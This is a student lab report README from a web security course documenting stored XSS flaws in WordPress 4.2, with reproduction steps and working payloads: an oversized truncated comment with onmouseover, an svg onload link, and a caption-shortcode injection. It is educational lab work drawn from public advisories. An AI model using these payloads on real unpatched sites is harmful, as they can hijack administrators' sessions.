# WebSecurityLab7
Lab 7 for Web Security Fall 2017
# Project 7 - WordPress Pentesting

Time spent: **X** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. Large File Upload Error XSS
  - [ ] Summary: In previous versions of Wordpress if a comment was greatear than 64 KB it would be truncated and stored in the database, the truncation allows for HTML to be generated on the page. Therefore by adding a comment longer than 64 KB with a piece of HTML code with Javascript embedded cross-site-scripting can be achieved.
    - Vulnerability types: XSS
    - Tested in version:4.2
    - Fixed in version:4.2.15
  - [ ] GIF Walkthrough: https://imgur.com/a/mrL2k
  - [ ] Steps to recreate: 
            1. Go to a page and create a comment similar to: <a title='x onmouseover=alert(unescape(/got%20em/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px AAAAAAAAAAAAGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFDSDSDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFDSDSDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFDSDSDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFDSDSDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDFFFFFFFFFFFFFF.............
            2. Post code into comment section
            3. Wait for admin to view the page >:)
    
2. Authenticated Cross Site Scripting XSS
  - [ ] Summary: In the comments section a user is able to take advantage of a link tag but being able to insert a javascript command into, thus allowing XSS.  
    - Vulnerability types: XSS
    - Tested in version: 4.2  
    - Fixed in version: 4.2.6
  - [ ] GIF Walkthrough: https://imgur.com/a/83uRn
  - [ ] Steps to recreate: 
        1. Go to a page. 
        2. Leave a comment with a link of the format
       http://www.example.com/wp-admin/customize.php?theme=<svg onload=alert(1)> (source: https://twitter.com/brutelogic/status/685105483397619713)

3. Authenticated Cross Site Scripting (XSS)
- [ ] Summary: In Wordpress users are able edit certain HTML portions of pages. In previous versions of wordpress users were able to enter malicious code via that HTML.
    - Vulnerability types:XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.3
  - [ ] GIF Walkthrough: https://imgur.com/a/tpPUl
  - [ ] Steps to recreate: 
        1. Go to page.
        2. Edit page, go to text and then add <code></code> tags.
        3. In tags add something of the form <a href="[caption code=">]</a><a title=" onmouseover=alert('test')  ">link</a>.
        4. Update page and load it.



## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).
https://klikki.fi/adv/wordpress3.html
https://wpvulndb.com/vulnerabilities/8358
https://hackerone.com/reports/203515
## Notes

Describe any challenges encountered while doing the work

## License


    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
